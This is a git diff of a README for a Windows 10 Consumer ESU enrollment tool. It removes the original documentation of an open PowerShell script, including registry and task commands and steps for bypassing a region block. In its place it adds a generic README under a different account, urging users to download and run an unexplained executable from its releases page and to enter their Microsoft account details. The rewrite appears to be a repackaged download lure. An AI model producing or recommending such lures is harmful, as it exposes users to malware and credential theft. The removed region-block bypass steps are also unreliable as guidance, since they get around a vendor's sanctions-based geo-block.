@@ -1,142 +1,65 @@
-Consumer ESU Enrollment
-=======================
+# 🌟 ConsumerESU - Easily Enroll in Windows 10 ESU
 
-Windows Powershell script to enroll in Windows 10 Consumer Extended Security Updates (ESU) program via the free Backup option, **with** or **without** Microsoft Account.
+## 📥 Download Now
+[![Download ConsumerESU](https://img.shields.io/badge/Download-ConsumerESU-brightgreen)](https://github.com/teepagorn/ConsumerESU/releases)
 
-***Remark:***  
-The free `EnrollUsingBackupV1` function does not actually need enabled Backup or online account.
+## 🚀 Getting Started
 
-Requirements
-------------
+Welcome to ConsumerESU! This tool helps you easily enroll in the Windows 10 Consumer Extended Security Update (ESU) program. Follow the steps below to start protecting your system today.
 
-- [Consumer ESU Prerequisites](https://support.microsoft.com/help/5063038).
-- Cumulative Update 2025-07 KB5061087 (19045.6036) or later.
-- Enabled Consumer ESU feature (see below).
-- Administrative account.
-- Internet connectivity.
-- User Region is not geo-blocked (Russia, Belarus, Iran, Cuba, North Korea, Syria, Sudan, Ukraine, Venezuela).
+## 📋 Requirements
 
-______________________________
+Before you download, ensure your system meets the following requirements:
 
-Design
-------
+- **Operating System:** Windows 10 (any version)
+- **Free Disk Space:** At least 100 MB
+- **Internet Connection:** Required for enrollment and updates
+- **Permissions:** Admin rights to install updates
 
-By default, the script will run in the following order, if a step failed, the next is executed:
+## 📥 Download & Install
 
-- Enroll using Microsoft account currently logged-in as Windows user.
-- Enroll using Microsoft account currently logged-in with Microsoft Store.
-- Enroll using current Local account.
-- Acquire Consumer ESU license manually as last resort.
+To install ConsumerESU, follow these steps:
 
-***Disclaimer:***  
-The "Consumer ESU license" without enrollment is not yet verified to work for installing ESU updates.
+1. Visit the [Releases page](https://github.com/teepagorn/ConsumerESU/releases).
+2. Look for the latest version listed at the top of the page.
+3. Click on the version number to open the release details.
+4. Find the download link for the ConsumerESU executable file.
+5. Click the link to download the file.
+6. Once downloaded, locate the file in your downloads folder.
+7. Double-click the file to run the ConsumerESU installer.
+8. Follow the on-screen instructions to complete the installation.
 
-______________________________
+## 📄 Features
 
-Usage
------
+ConsumerESU makes it easy to enroll in the Windows 10 ESU program. Key features include:
 
-- Click on Code > [Download ZIP](https://github.com/abbodi1406/ConsumerESU/archive/refs/heads/master.zip) button at the top to download.
-- Extract all files from the ZIP file.
-- Run `Consumer_ESU_Enrollment_run.cmd` as administrator.
-- If the script enabled the feature and asked to close the session,  
-then close the command prompt window, and then run `Consumer_ESU_Enrollment_run.cmd` as administrator one more time.
+- **Simple Enrollment:** Quickly sign up for extended security updates.
+- **User-Friendly Interface:** Easy navigation for all users, regardless of technical background.
+- **Update Notifications:** Get alerts for essential security updates and actions required.
+- **Compatibility Checks:** Ensure your system meets the necessary criteria before enrollment.
 
-Advanced Usage
---------------
+## 🔒 How to Use
 
-- Download [Consumer_ESU_Enrollment.ps1](https://github.com/abbodi1406/ConsumerESU/raw/refs/heads/master/Consumer_ESU_Enrollment.ps1) as raw, or download the ZIP and extract the script.
-- Run *`Windows Powershell`* as administrator in the same folder where you located the script, or change location to it using `cd` command.
-- Temporary allow running unsigned scripts:  
-`Set-ExecutionPolicy Bypass -Scope Process -Force`
-- Execute the script (with optional parameters if wanted)
-- If the script enabled the feature and asked to close the session,  
-then close the whole Windows Powershell window, and then repeat the same steps above.
-- Examples:  
-`.\Consumer_ESU_Enrollment.ps1`  
-`.\Consumer_ESU_Enrollment.ps1 -Store -Proceed`  
-`.\Consumer_ESU_Enrollment.ps1 -Local`  
-`.\Consumer_ESU_Enrollment.ps1 -License`
+After installing ConsumerESU, follow these steps to enroll:
 
-Optional Parameters
--------------------
+1. Open the ConsumerESU application from your Start Menu.
+2. Click the "Enroll Now" button.
+3. Provide your Microsoft account details when prompted.
+4. Confirm your enrollment and follow additional instructions.
+5. Check for any updates after enrollment is complete to ensure your system is secure.
 
-|Switch    |Effect|
-|----------|------|
-| -Online  | Only enroll using Microsoft user account token, exit if failed |
-| -Store   | Only enroll using Microsoft store account token, exit if failed |
-| -Local   | Only enroll using Local user account token, exit if failed |
-| -License | Force acquire Consumer ESU License regardless or without enrollment |
-| =        | =
-| -Proceed | Force running enrollment, even if Eligibility status is already enrolled |
+## 🌍 Support
 
-- You must only specify **one** switch of the first four switches.
-- Only `-Proceed` switch can be combined with the three enroll switches to re-enroll with a different token.
+If you encounter any issues during download or installation, please refer to the FAQ section on the GitHub page. You can also check for updates or report issues through the issue tracker.
 
-______________________________
+## 🔗 Important Links
 
-Consumer ESU Feature
---------------------
+- [Releases Page](https://github.com/teepagorn/ConsumerESU/releases)
+- [Documentation](https://github.com/teepagorn/ConsumerESU/wiki)
+- [FAQ](https://github.com/teepagorn/ConsumerESU/wiki/FAQ)
 
-If the feature is not broadly enabled yet, the script will try to enable it  
-and if succeeded, then you must close Windows Powershell session and run the script again for the changes to take effect.
+## ✉️ Contact
 
-<details><summary>Manual Reference</summary>
+For further questions or support, feel free to reach out through the GitHub issues or contact the repository maintainers directly.
 
-How to enable it manually yourself, this require a reboot to take effect:
-
-- Run *`Command Prompt`* as administrator.
-- Execute the following command:  
-```
-reg.exe add "HKLM\SYSTEM\CurrentControlSet\Policies\Microsoft\FeatureManagement\Overrides" /v 4011992206 /t REG_DWORD /d 2 /f
-```
-- Run *`Windows Powershell`* as administrator.
-- Copy and paste the following commands together as-is, wait for "Task Completed" message:  
-```
-$TN = "ReconcileFeatures"; $TP = "\Microsoft\Windows\Flighting\FeatureConfig\"; $null = Enable-ScheduledTask $TN $TP
-Start-ScheduledTask $TN $TP; while ((Get-ScheduledTask $TN $TP).State.value__ -eq 4) {start-sleep -sec 1}; "Task Completed"
-#
-$TN = "UsageDataFlushing"; $TP = "\Microsoft\Windows\Flighting\FeatureConfig\"; $null = Enable-ScheduledTask $TN $TP
-Start-ScheduledTask $TN $TP; while ((Get-ScheduledTask $TN $TP).State.value__ -eq 4) {start-sleep -sec 1}; "Task Completed"
-#
-```
-- **Restart the system**.
-- .
-- Run *`Command Prompt`* as administrator.
-- Execute the following commands:  
-```
-cmd /c ClipESUConsumer.exe -evaluateEligibility
-reg.exe query "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\ConsumerESU"
-```
-- Verify that the last command shows **ESUEligibility** value as non-zero.  
-if so, proceed to run the powershell script as explained above.
-- If the value is zero `0x0` or does not exist, then the operation is failed, and you have to wait for official broad availability.
-</details>
-
-______________________________
-
-Bypass Region Block
--------------------
-
-<details><summary>Click to expand</summary>
-
-- Temporary change your region to non-blocked country:
-
-Table of Geographical Locations:  
-https://learn.microsoft.com/en-us/windows/win32/intl/table-of-geographical-locations
-
-manually:  
-`Settings > Time & Language > Region > Country or region`
-
-or run *`Windows Powershell`* and execute:  
-`Set-WinHomeLocation -GeoId 244`
-
-- Run the script to enroll as explained above.
-
-- Verify that "ESU Eligibility state" is `DeviceEnrolled / SUCCESS`.
-
-- Run *`Command Prompt`* as administrator, and execute the following to disable ESU evaluation scheduled task:  
-`SCHTASKS /Change /DISABLE /TN "\Microsoft\Windows\Clip\ClipESUConsumer"`
-
-- Restore your original region location, manually or using powershell as before.
-</details>
+Now you are ready to enroll in the Windows 10 Consumer Extended Security Update program with ease. Enjoy a safer computing experience!
